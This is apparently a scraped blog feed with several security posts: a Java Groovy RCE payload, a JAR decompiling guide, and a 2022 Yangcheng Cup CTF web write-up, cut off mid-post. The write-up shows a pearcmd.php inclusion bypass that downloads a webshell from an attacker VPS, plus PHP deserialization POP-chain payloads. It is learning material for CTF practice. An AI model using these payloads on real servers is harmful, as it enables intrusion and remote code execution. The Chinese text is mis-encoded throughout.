<span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">GroovyShell</span>();</span><br><span class="line">groovyShell.evaluate(content);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//127.0.0.1:8080/rce/groovy?content=%22calc%22.execute()</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221008225020518.png" alt="image-20221008225020518"></p>]]></content>
      
      
      <categories>
          
          <category> javaå®‰å…¨ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java-sec-code </tag>
            
            <tag> cmdinject </tag>
            
            <tag> rce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä½¿ç”¨ideaè¿›è¡Œåç¼–è¯‘</title>
      <link href="/2022/10/09/%E4%BD%BF%E7%94%A8idea%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91/"/>
      <url>/2022/10/09/%E4%BD%BF%E7%94%A8idea%E8%BF%9B%E8%A1%8C%E5%8F%8D%E7%BC%96%E8%AF%91/</url>
      
        <content type="html"><![CDATA[<h1 id="ä½¿ç”¨ideaè¿›è¡Œåç¼–è¯‘"><a href="#ä½¿ç”¨ideaè¿›è¡Œåç¼–è¯‘" class="headerlink" title="ä½¿ç”¨ideaè¿›è¡Œåç¼–è¯‘"></a>ä½¿ç”¨ideaè¿›è¡Œåç¼–è¯‘</h1><p>é¦–å…ˆåœ¨ideaä¸­å®‰è£…æ’ä»¶ï¼Œè¿™é‡Œæˆ‘ä»marketplaceä¸­æ²¡æ‰¾åˆ°ï¼Œç„¶ååœ¨installedä¸­å‘ç°å·²ç»å®‰è£…å¥½äº†</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009082901210.png" alt="image-20221009082901210"></p><p>æ‰¾åˆ°<code>java-decompiler.jar</code>å­˜æ”¾çš„è·¯å¾„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\software\IntelliJ IDEA <span class="number">2021.2</span><span class="number">.3</span>\plugins\java-decompiler\lib\java-decompiler.jar</span><br></pre></td></tr></table></figure><p>åœ¨éœ€è¦åç¼–è¯‘çš„jaråŒ…åŒç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œç”¨æ¥å­˜æ”¾åç¼–è¯‘ä¹‹åçš„æ–‡ä»¶</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009083158266.png" alt="image-20221009083158266"></p><p>åœ¨æ”¹ç›®å½•ä¸‹æ‰“å¼€cmd(é»˜è®¤çš„javaæ˜¯java8)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp <span class="string">&quot;D:\software\IntelliJ IDEA 2021.2.3\plugins\java-decompiler\lib\java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="literal">true</span> app.jar app</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¼šæŠ¥é”™</p><blockquote><p>Error: A JNI error has occurred, please check your installation and try again<br>Exception in thread â€œmainâ€ java.lang.UnsupportedClassVersionError: org&#x2F;jetbrains&#x2F;java&#x2F;decompiler&#x2F;main&#x2F;decompiler&#x2F;ConsoleDecompiler has been compiled by a more recent version of the Java Runtime (class file version 55.0), this version of the Java Runtime only recognizes class file versions up to 52.0</p></blockquote><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009090102729.png" alt="image-20221009090102729"></p><p>è¿™æ˜¯å› ä¸ºjaråŒ…ä¸­çš„classæ–‡ä»¶çš„ç‰ˆæœ¬å’Œæœ¬æœºçš„javaç‰ˆæœ¬ä¸å¯¹åº”çš„ç¼˜æ•…</p><p><strong>classæ–‡ä»¶ç‰ˆæœ¬è·Ÿjdkç‰ˆæœ¬å¯¹åº”å…³ç³»å¦‚ä¸‹</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">49</span> = Java <span class="number">5</span></span><br><span class="line"><span class="number">50</span> = Java <span class="number">6</span></span><br><span class="line"><span class="number">51</span> = Java <span class="number">7</span></span><br><span class="line"><span class="number">52</span> = Java <span class="number">8</span></span><br><span class="line"><span class="number">53</span> = Java <span class="number">9</span></span><br><span class="line"><span class="number">54</span> = Java <span class="number">10</span></span><br><span class="line"><span class="number">55</span> = Java <span class="number">11</span></span><br><span class="line"><span class="number">56</span> = Java <span class="number">12</span></span><br><span class="line"><span class="number">57</span> = Java <span class="number">13</span></span><br><span class="line"><span class="number">58</span> = Java <span class="number">14</span></span><br><span class="line"><span class="number">59</span> = Java <span class="number">15</span></span><br><span class="line"><span class="number">60</span> = Java <span class="number">16</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æ ¹æ®æŠ¥é”™ï¼Œåº”è¯¥é‡‡ç”¨java11è¿›è¡Œåç¼–è¯‘</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\environment\java\jdk-<span class="number">11.0</span><span class="number">.2</span>\bin\java.exe -cp <span class="string">&quot;D:\software\IntelliJ IDEA 2021.2.3\plugins\java-decompiler\lib\java-decompiler.jar&quot;</span> org.jetbrains.java.decompiler.main.decompiler.ConsoleDecompiler -dgs=<span class="literal">true</span> app.jar app</span><br></pre></td></tr></table></figure><p>è¿è¡ŒæˆåŠŸ</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009090324831.png" alt="image-20221009090324831"></p><p>æœ€ååœ¨æŒ‡å®šçš„æ–‡ä»¶å¤¹ä¸‹ä¼šå‡ºç°ä¸€ä¸ªå·²ç»ç¼–è¯‘å¥½çš„jaråŒ…ï¼Œè¿›è¡Œè§£å‹æŸ¥çœ‹å³å¯</p><p>å…¶ä¸­çš„æºç å·²ç»åç¼–è¯‘ä¸ºjavaæ–‡ä»¶</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20221009090453102.png" alt="image-20221009090453102"></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ol><li><a href="https://blog.csdn.net/q863672107/article/details/124367310">(8æ¡æ¶ˆæ¯) ä½¿ç”¨IDEAçš„åç¼–è¯‘æ’ä»¶ åç¼–è¯‘jaråŒ…&#x2F;classæ–‡ä»¶&#x2F;ä¿®æ”¹jaråŒ…_cyæ¯”æ˜¨å¤©æ›´å¥½çš„åšå®¢-CSDNåšå®¢_ideaåç¼–è¯‘jaræ’ä»¶</a></li><li><a href="https://blog.csdn.net/Alexz__/article/details/108689610">(8æ¡æ¶ˆæ¯) ä½¿ç”¨IntelliJ IDEAåç¼–è¯‘JaråŒ…_Alexz__çš„åšå®¢-CSDNåšå®¢</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> æ‚è®° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> idea </tag>
            
            <tag> åç¼–è¯‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022ç¾ŠåŸæ¯-Web</title>
      <link href="/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/"/>
      <url>/2022/09/04/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF-Web/</url>
      
        <content type="html"><![CDATA[<h1 id="ç¾ŠåŸæ¯"><a href="#ç¾ŠåŸæ¯" class="headerlink" title="ç¾ŠåŸæ¯"></a>ç¾ŠåŸæ¯</h1><p>[toc]</p><h2 id="ç­¾åˆ°"><a href="#ç­¾åˆ°" class="headerlink" title="ç­¾åˆ°"></a>ç­¾åˆ°</h2><blockquote><p>E:\markdown\CTF\2022æ¯”èµ›\0903ç¾ŠåŸæ¯&gt;ciphey -t â€œZMJTPM33ZEDJXZOMTOGQRZOETN4GPMOFZV4GPAGPZD2TRBYRZRMJXAOIZR2U2&#x3D;&#x3D;&#x3D;â€<br>Possible plaintext: â€˜flag{dae090f201091d2b916bd4b9da3e45a4}â€™ (y&#x2F;N): y<br>â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®<br>â”‚ The plaintext is a Capture The Flag (CTF) Flag             â”‚<br>â”‚ Formats used:                                              â”‚<br>â”‚    caesar:                                                 â”‚<br>â”‚     Key: 13                                                â”‚<br>â”‚    base32                                                  â”‚<br>â”‚    utf8Plaintext: â€œflag{dae090f201091d2b916bd4b9da3e45a4}â€ â”‚<br>â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯</p></blockquote><h2 id="rce-me"><a href="#rce-me" class="headerlink" title="rce_me"></a>rce_me</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">(<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>])) ? <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>) : <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fliter</span>(<span class="params"><span class="variable">$var</span></span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">     <span class="variable">$blacklist</span> = [<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;?&quot;</span>,<span class="string">&quot;$&quot;</span>,<span class="string">&quot;[&quot;</span>,<span class="string">&quot;]&quot;</span>,<span class="string">&quot;;&quot;</span>,<span class="string">&quot;eval&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;@&quot;</span>,<span class="string">&quot;_&quot;</span>,<span class="string">&quot;create&quot;</span>,<span class="string">&quot;install&quot;</span>,<span class="string">&quot;pear&quot;</span>];</span><br><span class="line">         <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">           <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> False;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> True;</span><br><span class="line">&#125;  </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fliter</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;QUERY_STRING&quot;</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;Noooo0&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»•è¿‡stristrï¼š</p><p>æ·»åŠ å›è½¦ç¬¦%0aç»•è¿‡æ£€æµ‹(è®°å¾—è¦åœ¨å›è½¦ç¬¦ä¹‹å‰è½¬ä¹‰ï¼Œä¸ç„¶htaccessä¼šæŠ¥é”™)ï¼Œsystemå‡½æ•°å†…å¯ä»¥æ‹¼æ¥å­—ç¬¦ä¸²ç»•è¿‡</p><p>pearcmd.phpæ–‡ä»¶åŒ…å«ï¼Œé¢˜ç›®è¿‡æ»¤äº†createå’Œinstallï¼Œä½†æ˜¯è¿˜èƒ½ç”¨downloadï¼Œå¹¶ä¸”å¯¹<code>$_SERVER[&quot;QUERY_STRING&quot;])</code>çš„è¿‡æ»¤å¯ä»¥é€šè¿‡urlç¼–ç ç»•è¿‡</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220904082808666.png" alt="image-20220904082808666"></p><p>vpsä¸Šæ•´ä¸€ä¸ª1.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">phpinfo</span>();<span class="meta">?&gt;</span></span><br><span class="line">ä¸‹è½½</span><br><span class="line">?file=/usr/local/lib/php/%<span class="number">70</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">72</span>cmd.php&amp;+download+http:<span class="comment">//vps:7002/1.txt</span></span><br></pre></td></tr></table></figure><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184350966.png" alt="image-20220903184350966"></p><p>æ–‡ä»¶åŒ…å«æˆåŠŸï¼Œæ•´ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬ï¼Œæ”¾è¿›2.txt</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/lib/php/%<span class="number">70</span>%<span class="number">65</span>%<span class="number">61</span>%<span class="number">72</span>cmd.php&amp;+download+http:<span class="comment">//vps:7002/2.txt</span></span><br></pre></td></tr></table></figure><p>ä¸‹è½½è¿œç¨‹æ–‡ä»¶2.txt</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184203562.png" alt="image-20220903184203562"></p><p>èšå‰‘è¿æ¥ï¼Œè™šæ‹Ÿç»ˆç«¯ï¼Œç»å…¸çš„dateææƒï¼Œå’Œè“å¸½æ¯ä¸€æ ·</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903182842310.png" alt="image-20220903182842310"></p><h2 id="step-by-step"><a href="#step-by-step" class="headerlink" title="step_by_step"></a>step_by_step</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">yang</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$y1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// $this-&gt;y1-&gt;magic();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;y1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hint</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hintæ¯è°ƒç”¨&#x27;</span>;</span><br><span class="line">        <span class="keyword">include_once</span>(<span class="string">&#x27;hint.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/<span class="subst">$hey_mean_then</span>/is&quot;</span>, <span class="variable">$file</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">include_once</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cheng</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;flag = <span class="string">&#x27;flag&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c1-&gt;<span class="title function_ invoke__">hint</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bei</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$k1</span>,<span class="variable">$k2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$n1</span>,<span class="variable">$n2</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;b1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$aaa</span> = <span class="keyword">new</span> <span class="title function_ invoke__">cheng</span>();</span><br><span class="line"><span class="variable">$bbb</span> = <span class="keyword">new</span> <span class="title function_ invoke__">bei</span>();</span><br><span class="line"><span class="variable">$ccc</span> = <span class="keyword">new</span> <span class="title function_ invoke__">yang</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// $ddd = new cheng();</span></span><br><span class="line"><span class="comment">// $ddd-&gt;c1 = new yang();</span></span><br><span class="line"><span class="comment">// $ccc-&gt;y1 = &quot;hint&quot;;</span></span><br><span class="line"><span class="variable">$ccc</span>-&gt;y1 = <span class="string">&quot;phpinfo&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$ccc</span>);</span><br><span class="line"><span class="variable">$bbb</span>-&gt;b1 = <span class="variable">$ccc</span>;</span><br><span class="line"><span class="variable">$aaa</span>-&gt;c1 = <span class="variable">$bbb</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$aaa</span>);</span><br><span class="line"><span class="comment">// unserialize(serialize($aaa));</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="comment">// O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:2:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;N;&#125;&#125;&#125;s:2:&quot;b2&quot;;N;&#125;&#125;</span></span><br><span class="line"><span class="comment">// O:5:&quot;cheng&quot;:1:&#123;s:2:&quot;c1&quot;;O:3:&quot;bei&quot;:2:&#123;s:2:&quot;b1&quot;;O:4:&quot;yang&quot;:1:&#123;s:2:&quot;y1&quot;;s:7:&quot;phpinfo&quot;;&#125;s:2:&quot;b2&quot;;N;&#125;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥æŸ¥çœ‹phpinfoï¼Œå°±å¯å¾—flagï¼Œç¦»è°±å•Š</p><p><img src="https://sk1y2333.oss-cn-beijing.aliyuncs.com/img/image-20220903184831886.png" alt="image-20220903184831886"></p><h2 id="safepop"><a href="#safepop" class="headerlink" title="safepop"></a>safepop</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL);</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fun</span></span>&#123;</span><br><span class="line">    <span class="comment">// private $func = &#x27;call_user_func_array&#x27;;</span></span><br><span class="line">    <span class="comment">// private $func = &quot;phpinfo&quot;;</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = [<span class="keyword">new</span> <span class="title class_">Test</span>(),<span class="string">&quot;getFlag&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•</span></span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;func,<span class="variable">$f</span>,<span class="variable">$p</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="comment">//ååºåˆ—åŒ–ä¹‹å‰è°ƒç”¨  éœ€è¦ç»•è¿‡   å½“æˆå‘˜å±æ€§æ•°ç›®å¤§äºå®é™…æ•°ç›®æ—¶å¯ç»•è¿‡wakeupæ–¹æ³•(CVE-2016-7124)</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;func = <span class="string">&#x27;&#x27;</span>;   <span class="comment">//ç›¸å½“äºwaf</span></span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Don&#x27;t serialize me&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat /flag?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//åœ¨å¯¹è±¡ä¸­è°ƒç”¨ä¸€ä¸ªä¸å¯è®¿é—®æ–¹æ³•</span></span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();      <span class="comment">//å¯èƒ½ä»è¿™é‡Œè·å–ä¿¡æ¯</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;     <span class="comment">//ååºåˆ—åŒ–ä¹‹å‰è°ƒç”¨</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;serialize me?&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="keyword">new</span> <span class="title class_">Fun</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$p</span></span>)</span>&#123;      <span class="comment">//è¯»å–ä¸å¯è®¿é—®ï¼ˆprotected æˆ– 